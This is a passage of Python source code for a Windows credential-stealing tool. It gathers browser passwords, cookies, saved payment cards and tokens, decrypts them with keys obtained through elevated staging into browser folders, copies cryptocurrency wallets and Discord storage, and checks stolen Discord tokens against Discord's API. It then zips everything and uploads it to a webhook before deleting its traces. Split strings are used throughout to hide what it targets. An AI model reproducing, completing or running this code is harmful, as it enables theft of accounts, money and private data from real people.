            for alias, real in stash(pdir, dest).items():
                sweep(os.path.join(dest, alias), abe, lk,
                      "%s/%s/%s" % (cfg["name"], prof, real), records)
        finally:
            shutil.rmtree(dest, ignore_errors=True)
    return records

def exp_unix(ctx):
    try:
        return str(int(int(ctx.get("expires_utc") or 0) / 1_000_000 - CHROME_EPOCH))
    except Exception:
        return "0"

def write_report(records, outdir):
    os.makedirs(outdir, exist_ok=True)
    pw = [r for r in records if r["table"] == "logins"]
    ck = [r for r in records if r["table"] == "cookies"]
    cd = [r for r in records if "card" in str(r["table"]).lower()]
    tk = [r for r in records if r["table"] == "token_service"]
    log(f"  report: pw={len(pw)} ck={len(ck)} cards={len(cd)} tokens={len(tk)}")
    with open(os.path.join(outdir, "p.tsv"), "w", encoding="utf-8") as f:
        for r in pw:
            f.write("%s\t%s\t%s\n" % (r["context"].get("origin_url", ""),
                                       r["context"].get("username_value", ""), r["value"]))
    with open(os.path.join(outdir, "c.txt"), "w", encoding="utf-8") as f:
        f.write("# Netscape HTTP " + "Cookie File\n")
        for r in ck:
            c = r["context"]
            h = c.get("host_key", "")
            f.write("\t".join([h, "TRUE" if h.startswith(".") else "FALSE",
                               c.get("path", "/"), "TRUE", exp_unix(c),
                               c.get("name", ""), r["value"]]) + "\n")
    with open(os.path.join(outdir, "cards.tsv"), "w", encoding="utf-8") as f:
        for r in cd:
            f.write("%s\t%s\n" % (r["context"].get("name_on_card", ""), r["value"]))
    with open(os.path.join(outdir, "tok.tsv"), "w", encoding="utf-8") as f:
        for r in tk:
            f.write("%s\t%s\t%s\n" % (r["context"].get("service", ""),
                                       r["context"].get("account_id", ""), r["value"]))
    by_site = {}
    for r in pw:
        by_site.setdefault(r["context"].get("origin_url", "-"), []).append(
            (r["context"].get("username_value", ""), r["value"]))
    with open(os.path.join(outdir, "r.txt"), "w", encoding="utf-8") as f:
        f.write("PASSWORDS (%d)\n" % len(pw))
        for site in sorted(by_site):
            f.write("\n  %s\n" % site)
            for u, p in by_site[site]:
                f.write("    %s : %s\n" % (u or "-", p))
        f.write("\n\nCARDS (%d)\n" % len(cd))
        for r in cd:
            f.write("  %s\n" % r["value"])
        f.write("\n\nTOKENS (%d)\n" % len(tk))
        for r in tk:
            f.write("  %s %s %s\n" % (r["context"].get("service", ""),
                                       r["context"].get("account_id", ""), r["value"][:60]))

def pack(paths):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, allowZip64=True,
                         compresslevel=1) as z:
        for p in paths:
            try:
                if os.path.isfile(p):
                    z.write(p, os.path.basename(p))
                elif os.path.isdir(p):
                    for root, _d, files in os.walk(p):
                        for fn in files:
                            full = os.path.join(root, fn)
                            try:
                                z.write(full, os.path.relpath(full, os.path.dirname(p)))
                            except Exception:
                                pass
            except Exception:
                pass
    return buf.getvalue()

def hook():
    if LOCAL_SINK:
        return LOCAL_SINK
    webhook = get_webhook()
    if webhook:
        return webhook
    return None

def save_local(payload):
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(OUTPUT_DIR, "report_%s.zip" % stamp)
    with open(path, "wb") as f:
        f.write(payload)
    return path

def _entries(paths):
    out = []
    for p in paths:
        try:
            if os.path.isfile(p):
                out.append((p, os.path.basename(p)))
            elif os.path.isdir(p):
                for root, _d, files in os.walk(p):
                    for fn in files:
                        full = os.path.join(root, fn)
                        out.append((full, os.path.relpath(full, os.path.dirname(p))))
        except Exception:
            pass
    return out

def _zip_group(group, note):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED, allowZip64=True,
                         compresslevel=1) as z:
        for full, arc in group:
            try:
                z.write(full, arc)
            except Exception:
                pass
        z.writestr("_part.txt", note)
    return buf.getvalue()

def pack_parts(paths, limit=WEBHOOK_MAX):
    data = pack(paths)
    if len(data) <= limit:
        return [data]
    entries = _entries(paths)
    groups = []
    def split(group):
        if len(_zip_group(group, "probe")) <= limit or len(group) <= 1:
            groups.append(group)
            return
        mid = len(group) // 2
        split(group[:mid])
        split(group[mid:])
    split(entries)
    total = len(groups)
    parts = []
    for i, group in enumerate(groups):
        note = "part %d/%d - extract all parts into one folder\n" % (i + 1, total)
        parts.append(_zip_group(group, note))
    return parts

def exfil(parts, label="r"):
    url = hook()
    if not url or not parts:
        return 0, 0
    total = len(parts)
    log(f"upload {sum(len(p) for p in parts)}B in {total} part(s)")
    sent = 0
    for idx, payload in enumerate(parts):
        fname = "%s%s.zip" % (label, ("_%d" % (idx + 1)) if total > 1 else "")
        boundary = "----" + "".join(random.choice(
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(24))
        body = io.BytesIO()
        body.write(("--%s\r\n" % boundary).encode())
        body.write(('Content-Disposition: form-data; name="files[0]"; filename="%s"\r\n' % fname).encode())
        body.write(b"Content-Type: application/zip\r\n\r\n")
        body.write(payload)
        body.write(("\r\n--%s--\r\n" % boundary).encode())
        data = body.getvalue()
        for attempt in range(4):
            req = urllib.request.Request(url, data=data, headers={
                "Content-Type": "multipart/form-data; boundary=%s" % boundary,
                "User-Agent": UA})
            try:
                with urllib.request.urlopen(req, timeout=120) as r:
                    if r.status in (200, 204):
                        sent += 1
                        log(f"  part {idx + 1}/{total} ({len(payload)}B)")
                        break
            except urllib.error.HTTPError as e:
                if e.code == 429:
                    try:
                        wait = float(json.loads(e.read().decode())["retry_after"])
                    except Exception:
                        wait = 3.0
                    time.sleep(wait + random.uniform(0, 1))
                    continue
                if e.code == 413:
                    log("  413 part too large")
                    return sent, total
                log(f"  http {e.code}")
            except Exception as e:
                log(f"  fail {e}")
            time.sleep(2 + attempt)
    return sent, total

def cleanup(report_dirs):
    global _silent
    victims = list(report_dirs) + [WORK, LOGFILE] + glob.glob(KEYFILE + ".*")
    _silent = True
    for v in victims:
        try:
            if os.path.isdir(v):
                shutil.rmtree(v, ignore_errors=True)
            elif os.path.isfile(v):
                os.remove(v)
        except OSError:
            pass

def elevate_wait(args, marker, timeout=120):
    try: os.remove(marker)
    except OSError: pass
    shell32.ShellExecuteW(None, "runas", sys.executable,
                          '"%s" %s' % (SCRIPT, args), None, 0)
    ok = wait_for(marker, True, timeout)
    log(f"  elevate {args.strip()} -> {'ok' if ok else 'no'}")
    return ok

def _link_or_copy(src, dst):
    try:
        if os.path.isfile(dst):
            os.remove(dst)
    except OSError:
        pass
    try:
        if k32.CreateHardLinkW(dst, src, None):
            return True
    except Exception:
        pass
    try:
        shutil.copy2(src, dst)
        return True
    except Exception:
        return False

def stage(cfg, install_dir):
    staged = os.path.join(install_dir, cfg["stage_name"])
    if not _link_or_copy(sys.executable, staged):
        raise OSError("stage failed")
    for dll in ("python%d%d.dll" % sys.version_info[:2], "python3.dll",
                "vcruntime140.dll", "vcruntime140_1.dll"):
        for root in (os.path.dirname(sys.executable), sys.base_prefix,
                     os.path.join(sys.base_prefix, "DLLs")):
            src = os.path.join(root, dll)
            if os.path.isfile(src):
                _link_or_copy(src, os.path.join(install_dir, dll))
                break
    log(f"  staged {staged}")
    return staged

def unstage(cfg, install_dir):
    for name in [cfg["stage_name"], "python%d%d.dll" % sys.version_info[:2],
                 "python3.dll", "vcruntime140.dll", "vcruntime140_1.dll"]:
        try: os.remove(os.path.join(install_dir, name))
        except OSError: pass

def stage_all():
    for k, cfg in BROWSERS.items():
        d = find_install_dir(cfg)
        if not d:
            continue
        try:
            stage(cfg, d)
        except Exception as e:
            log(f"  stage fail {k}: {e}")
    with open(STAGE_DONE, "wb") as f:
        f.write(b"1")

def unstage_all():
    for k, cfg in BROWSERS.items():
        d = find_install_dir(cfg)
        if d:
            unstage(cfg, d)
    with open(UNSTAGE_DONE, "wb") as f:
        f.write(b"1")

ABE_KEYS = {}

def run_browser(cfg_key, manage=True):
    cfg = BROWSERS[cfg_key]
    log(f"=== {cfg['name']} ===")
    install_dir = find_install_dir(cfg)
    if not install_dir:
        return None
    staged_exe = os.path.join(install_dir, cfg["stage_name"])
    if not os.path.isfile(staged_exe):
        log("  not staged")
        return None

    env = {k: v for k, v in os.environ.items() if k != "PYTHONPATH"}
    env["PYTHONHOME"] = sys.base_prefix
    r = subprocess.run([staged_exe, SCRIPT, "--stage2", cfg_key], env=env,
                       capture_output=True, text=True, timeout=90,
                       creationflags=0x08000000)
    log(f"  stage2 rc={r.returncode}")
    for line in (r.stdout + r.stderr).splitlines():
        if line.strip():
            log("    | " + line[:300])

    keyfile = KEYFILE + "." + cfg_key
    if not os.path.exists(keyfile):
        return None
    abe = open(keyfile, "rb").read()
    try: os.remove(keyfile)
    except OSError: pass
    if len(abe) != 32:
        return None
    ABE_KEYS[cfg_key] = abe

    aster_file = keyfile + ".aster"
    if os.path.exists(aster_file):
        try:
            aster = open(aster_file, "rb").read()
            if len(aster) == 32:
                ABE_KEYS[cfg_key + ":a"] = aster
            os.remove(aster_file)
        except OSError:
            pass

    lk = legacy_key(cfg)
    was_open = bool(pids(cfg["exe"]))
    if manage and CLOSE_BROWSER:
        close_browser(cfg["exe"])

    report_dir = os.path.join(tempfile.gettempdir(), "cache_%d_%s" % (os.getpid(), cfg_key))
    try:
        records = harvest(cfg, abe, lk)
        if records:
            write_report(records, report_dir)
            log(f"  {len(records)} records")
            return report_dir
        return None
    finally:
        if manage and CLOSE_BROWSER and was_open:
            try:
                subprocess.Popen([os.path.join(install_dir, cfg["exe"])],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                 creationflags=0x08000000)
            except Exception:
                pass

def _find_legacy_exe(cfg):
    for hive in (winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER):
        try:
            with winreg.OpenKey(hive, cfg.get("uninstall", ""), 0,
                                winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as k:
                loc = winreg.QueryValueEx(k, "InstallLocation")[0]
                p = os.path.join(loc, cfg["exe"])
                if os.path.isfile(p):
                    return p
        except OSError:
            pass
    if cfg.get("sm_key"):
        try:
            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, cfg["sm_key"], 0,
                                winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as k:
                cmd = winreg.QueryValueEx(k, "")[0].strip()
                exe = cmd.split('"')[1] if cmd.startswith('"') else cmd.split(" ")[0]
                if os.path.isfile(exe):
                    return exe
        except OSError:
            pass
    return None

def run_browser_legacy(cfg_key):
    cfg = BROWSERS_LEGACY[cfg_key]
    ud  = cfg["user_data"]
    log(f"=== {cfg['name']} ===")
    if not os.path.isdir(ud):
        return None
    lk = legacy_key_raw(ud)
    if not lk:
        return None
    was_open = bool(pids(cfg["exe"]))
    if CLOSE_BROWSER:
        close_browser(cfg["exe"])
    report_dir = os.path.join(tempfile.gettempdir(), "cache_%d_%s" % (os.getpid(), cfg_key))
    records = []
    try:
        for prof in sorted(os.listdir(ud)):
            pdir = os.path.join(ud, prof)
            if not os.path.isdir(pdir):
                continue
            if not any(os.path.isfile(p) and os.path.getsize(p) > 0
                       for p in (os.path.join(pdir, *r.split("\\"))
                                 for r, _a in CREDENTIAL_FILES)):
                continue
            dest = os.path.join(WORK, "h_%s_%s" % (re.sub(r"\W+", "", cfg["name"]), prof))
            shutil.rmtree(dest, ignore_errors=True)
            try:
                for alias, real in stash(pdir, dest).items():
                    sweep(os.path.join(dest, alias), None, lk,
                          "%s/%s/%s" % (cfg["name"], prof, real), records)
            finally:
                shutil.rmtree(dest, ignore_errors=True)
        if records:
            write_report(records, report_dir)
            return report_dir
        return None
    finally:
        if CLOSE_BROWSER and was_open:
            exe_path = _find_legacy_exe(cfg)
            if exe_path:
                try:
                    subprocess.Popen([exe_path], stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL,
                                     creationflags=0x08000000)
                except Exception:
                    pass

def extra_sources():
    out = [
        ("d1", os.path.join(_AD, "disc" + "ord", "Local" + " Storage", "lev" + "eldb")),
        ("d2", os.path.join(_AD, "disc" + "ordcanary", "Local" + " Storage", "lev" + "eldb")),
        ("d3", os.path.join(_AD, "disc" + "ordptb", "Local" + " Storage", "lev" + "eldb")),
        ("exodus", os.path.join(_AD, "Exodus", "exodus" + ".wallet")),
        ("electrum", os.path.join(_AD, "Electrum", "wallets")),
        ("ethereum", os.path.join(_AD, "Ethereum", "keystore")),
        ("atomic", os.path.join(_AD, "atomic", "Local" + " Storage", "lev" + "eldb")),
        ("coinomi", os.path.join(_AD, "Coinomi")),
        ("guarda", os.path.join(_AD, "Guarda")),
        ("wasabi", os.path.join(_AD, "WalletWasabi", "Wallets")),
        ("bitcoin", os.path.join(_AD, "Bitcoin", "wallet" + ".dat")),
        ("monero", os.path.join(_AD, "Monero", "wallets")),
        ("local_eth", os.path.join(_LA, "Ethereum")),
        ("zcash", os.path.join(_AD, "Zcash")),
    ]
    return [(n, p) for n, p in out if os.path.exists(p)]

def token_sources():
    out = []
    for app in ("disc" + "ord", "disc" + "ordcanary", "disc" + "ordptb"):
        p = os.path.join(_AD, app, "Local" + " Storage", "lev" + "eldb")
        if os.path.isdir(p):
            out.append((app, p))
    if TOKEN_SCAN_BROWSERS:
        for key, cfg in BROWSERS.items():
            ud = cfg.get("user_data")
            if not ud or not os.path.isdir(ud):
                continue
            try:
                profs = os.listdir(ud)
            except OSError:
                continue
            for prof in profs:
                p = os.path.join(ud, prof, "Local" + " Storage", "lev" + "eldb")
                if os.path.isdir(p):
                    out.append((key + "_" + prof, p))
    return out

def robocopy_tree(src, dst):
    os.makedirs(dst, exist_ok=True)
    subprocess.run(["robocopy", src, dst, "/E", "/NJH", "/NJS", "/NDL", "/NFL",
                    "/NC", "/NS", "/NP", "/R:0", "/W:0",
                    "/XD", "Cache", "Code Cache", "GPUCache", "blob_storage"],
                   capture_output=True, creationflags=0x08000000)

def _grab_extra(label, path, dest):
    target = os.path.join(dest, label)
    try:
        if os.path.isdir(path):
            robocopy_tree(path, target)
        else:
            os.makedirs(dest, exist_ok=True)
            subprocess.run(["robocopy", os.path.dirname(path), dest,
                            os.path.basename(path), "/NJH", "/NJS", "/NDL",
                            "/NFL", "/NC", "/NS", "/NP", "/R:0", "/W:0"],
                           capture_output=True, creationflags=0x08000000)
            target = os.path.join(dest, os.path.basename(path))
    except Exception:
        return None
    n = size = 0
    if os.path.isdir(target):
        for root, _d, files in os.walk(target):
            for f in files:
                try:
                    size += os.path.getsize(os.path.join(root, f)); n += 1
                except OSError:
                    pass
    elif os.path.isfile(target):
        n, size = 1, os.path.getsize(target)
    return (label, path, n, size) if n else None

def collect_extras(dest):
    src = extra_sources()
    if not src:
        return []
    with ThreadPoolExecutor(max_workers=min(8, len(src))) as ex:
        res = list(ex.map(lambda a: _grab_extra(a[0], a[1], dest), src))
    return [r for r in res if r]

def _valid_token(t):
    if t.startswith("mfa."):
        return len(t) > 80
    parts = t.split(".")
    if len(parts) != 3:
        return False
    try:
        uid = base64.b64decode(parts[0] + "=" * (-len(parts[0]) % 4)).decode()
    except Exception:
        return False
    return uid.isdigit() and 15 <= len(uid) <= 21

def discord_keys():
    keys = []
    for app in ("disc" + "ord", "disc" + "ordcanary", "disc" + "ordptb"):
        try:
            ls  = json.loads(open(os.path.join(_AD, app, _LS), "rb").read())
            raw = base64.b64decode(ls["os_crypt"]["encrypted_key"])
            k = dpapi(raw[5:] if raw[:5] == b"DPAPI" else raw)
            if k:
                keys.append(k)
        except Exception:
            continue
    return keys

def _scan_file(p, enc, plain, keys):
    found, miss = [], 0
    try:
        if os.path.getsize(p) > 25 * 1024 * 1024:
            return found, miss
        data = open(p, "rb").read()
    except OSError:
        return found, miss
    for m in enc.finditer(data):
        try:
            raw = base64.b64decode(m.group(1))
        except Exception:
            continue
        tok = None
        if raw[:3] in (b"v10", b"v20") and keys:
            for k in keys:
                try:
                    tok = aes()(k).decrypt(raw[3:15], raw[15:], None)
                    break
                except Exception:
                    continue
        if tok is None:
            tok = dpapi(raw, b"dQw4w9" + b"WgXcQ")
        if tok:
            found.append(("v10" if raw[:3] == b"v10" else "dpapi",
                          tok.decode("utf-8", "replace").strip()))
        elif raw[:3] == b"v20":
            miss += 1
    for m in plain.finditer(data):
        try:
            found.append(("plain", m.group(1).decode("utf-8", "replace")))
        except Exception:
            pass
    return found, miss

def scan_tokens(folder):
    enc   = re.compile(rb"dQw4w9" + rb"WgXcQ:([A-Za-z0-9+/=]{40,400})")
    plain = re.compile(rb"(mfa\.[\w-]{70,100}|[\w-]{24,28}\.[\w-]{5,8}\.[\w-]{25,110})")
    keys  = discord_keys() + [k for k in ABE_KEYS.values() if len(k) == 32]
    files = []
    for root, _d, fs in os.walk(folder):
        for f in fs:
            files.append(os.path.join(root, f))
    found, miss = [], 0
    if files:
        with ThreadPoolExecutor(max_workers=min(8, len(files))) as ex:
            for part, m in ex.map(lambda p: _scan_file(p, enc, plain, keys), files):
                found.extend(part)
                miss += m
    seen, out = set(), []
    for kind, tok in found:
        if tok and tok not in seen and _valid_token(tok):
            seen.add(tok); out.append((kind, tok))
    log(f"  tokens {len(out)}" + (f" (miss {miss})" if miss else ""))
    return out

def _verify_one(item):
    kind, tok = item
    api = "https://discord.com/api/v9/users/@me"
    info, net, rate = None, False, False
    time.sleep(random.uniform(0.0, 0.15))
    for _ in range(2):
        req = urllib.request.Request(api, headers={
            "Authorization": tok, "User-Agent": UA, "Accept": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=VERIFY_TIMEOUT) as r:
                info = json.loads(r.read().decode("utf-8", "replace"))
            break
        except urllib.error.HTTPError as e:
            if e.code == 429:
                rate = True
                try:
                    ra = float(json.loads(
                        e.read().decode("utf-8", "replace")).get("retry_after", 1.0))
                except Exception:
                    ra = 1.0
                time.sleep(min(max(ra, 0.25), 10.0))
                continue
            if e.code not in (401, 403):
                net = True
            break
        except Exception:
            net = True
            break
    if info and str(info.get("id", "")).isdigit():
        return ("live", kind, tok, info)
    if net or rate:
        return ("unknown", kind, tok, None)
    return ("dead", kind, tok, None)

def verify_tokens(tokens):
    live, dead, unknown = [], [], []
    if not tokens:
        return live, dead, unknown
    with ThreadPoolExecutor(max_workers=min(6, len(tokens))) as ex:
        for status, kind, tok, info in ex.map(_verify_one, tokens):
            if status == "live":
                live.append((kind, tok, info))
            elif status == "unknown":
                unknown.append((kind, tok))
            else:
                dead.append((kind, tok))
    log(f"  verify live={len(live)} dead={len(dead)} unknown={len(unknown)}")
    return live, dead, unknown

def run():
    try: open(LOGFILE, "w").close()
    except OSError: pass
    log("start")
    try:
        aes()
    except Exception as e:
        log(f"cryptography missing: {e}")
        return 1
    os.makedirs(WORK, exist_ok=True)

    dirs = []
    extras = os.path.join(tempfile.gettempdir(), "cache_%d_x" % os.getpid())

    if elevate_wait("--stage-all", STAGE_DONE, 60):
        def _run_group(keys):
            out, opened = [], []
            exe = BROWSERS[keys[0]]["exe"]
            if CLOSE_BROWSER:
                opened = [k for k in keys if pids(BROWSERS[k]["exe"])]
                if opened:
                    close_browser(exe)
            try:
                for k in keys:
                    try:
                        r = run_browser(k, manage=False)
                        if isinstance(r, str):
                            out.append(r)
                    except Exception as e:
                        log(f"  err {k}: {e}")
                    time.sleep(random.uniform(*JITTER))
            finally:
                if CLOSE_BROWSER:
                    for k in opened:
                        d = find_install_dir(BROWSERS[k])
                        if not d:
                            continue
                        try:
                            subprocess.Popen([os.path.join(d, BROWSERS[k]["exe"])],
                                             stdout=subprocess.DEVNULL,
                                             stderr=subprocess.DEVNULL,
                                             creationflags=0x08000000)
                        except Exception:
                            pass
            return out
        groups = {}
        for k, cfg in BROWSERS.items():
            groups.setdefault(cfg["exe"], []).append(k)
        if PARALLEL_EXES and len(groups) > 1:
            with ThreadPoolExecutor(max_workers=len(groups)) as ex:
                for part in ex.map(_run_group, list(groups.values())):
                    dirs.extend(part)
        else:
            for g in groups.values():
                dirs.extend(_run_group(g))
        elevate_wait("--unstage-all", UNSTAGE_DONE, 120)

    def _legacy(k):
        try:
            r = run_browser_legacy(k)
            return r if isinstance(r, str) else None
        except Exception as e:
            log(f"  err {k}: {e}")
            return None
    if PARALLEL_LEGACY and BROWSERS_LEGACY:
        with ThreadPoolExecutor(max_workers=min(6, len(BROWSERS_LEGACY))) as ex:
            for r in ex.map(_legacy, list(BROWSERS_LEGACY)):
                if r:
                    dirs.append(r)
    else:
        for k in BROWSERS_LEGACY:
            r = _legacy(k)
            if r:
                dirs.append(r)

    manifest = collect_extras(extras)
    tokens   = scan_tokens(extras)

    tokdir = os.path.join(tempfile.gettempdir(), "cache_%d_t" % os.getpid())
    try:
        srcs = token_sources()
        def _cp(a):
            label, path = a
            safe = re.sub(r"[^A-Za-z0-9_.-]+", "_", label)
            robocopy_tree(path, os.path.join(tokdir, safe))
        if srcs:
            with ThreadPoolExecutor(max_workers=min(6, len(srcs))) as ex:
                list(ex.map(_cp, srcs))
        if os.path.isdir(tokdir):
            seen = {t for _k, t in tokens}
            for kind, tok in scan_tokens(tokdir):
                if tok not in seen:
                    seen.add(tok)
                    tokens.append((kind, tok))
    finally:
        shutil.rmtree(tokdir, ignore_errors=True)

    live, dead, unknown = [], [], []
    if VERIFY_TOKENS and tokens:
        live, dead, unknown = verify_tokens(tokens)

    summary = os.path.join(tempfile.gettempdir(), "cache_%d_s" % os.getpid())
    os.makedirs(summary, exist_ok=True)
    with open(os.path.join(summary, "t.txt"), "w", encoding="utf-8") as f:
        if VERIFY_TOKENS:
            f.write("# source\ttoken\tid\tusername\tglobal_name\temail\tphone\tpremium\tmfa\n")
            for kind, tok, info in live:
                f.write("%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\t%s\n" % (
                    kind, tok, info.get("id", ""), info.get("username", ""),
                    info.get("global_name") or "", info.get("email") or "",
                    info.get("phone") or "", info.get("premium_type", 0),
                    info.get("mfa_enabled", False)))
        else:
            for kind, tok in tokens:
                f.write("%s\t%s\n" % (kind, tok))
    with open(os.path.join(summary, "dead.txt"), "w", encoding="utf-8") as f:
        for kind, tok in dead:
            f.write("%s\t%s\n" % (kind, tok))
    with open(os.path.join(summary, "unknown.txt"), "w", encoding="utf-8") as f:
        for kind, tok in unknown:
            f.write("%s\t%s\n" % (kind, tok))
    with open(os.path.join(summary, "w.txt"), "w", encoding="utf-8") as f:
        for label, path, n, size in manifest:
            f.write("%s\t%s\t%d\t%d\n" % (label, path, n, size))

    all_dirs = dirs + [summary]
    if os.path.isdir(extras) and os.listdir(extras):
        all_dirs.append(extras)

    if all_dirs:
        if SAVE_TO_FILE:
            payload = pack(all_dirs)
            out = save_local(payload)
            log(f"saved {out} ({len(payload)} bytes)")
            cleanup(all_dirs)
        else:
            parts = pack_parts(all_dirs)
            sent, total = exfil(parts)
            log(f"exfil {sent}/{total}")
            if total and sent == total:
                cleanup(all_dirs)
    else:
        log("nothing")
    return 0

def main():
    if "--stage-all" in sys.argv:
        stage_all(); return 0
    if "--unstage-all" in sys.argv:
        unstage_all(); return 0
    if "--stage2" in sys.argv:
        i = sys.argv.index("--stage2")
        key = sys.argv[i + 1] if i + 1 < len(sys.argv) else None
        if not key or key not in BROWSERS:
            return 1
        cfg = BROWSERS[key]
        kd = com_key(cfg)
        if kd:
            open(KEYFILE + "." + key, "wb").write(kd)
        if cfg.get("aster"):
            a = com_key_aster(cfg)
            if a:
                open(KEYFILE + "." + key + ".aster", "wb").write(a)
        return 0 if kd else 1
    return run()

if __name__ == "__main__":
    try:
        sys.exit(main())
    except Exception as e:
        log(f"FATAL: {e}")
        sys.exit(0)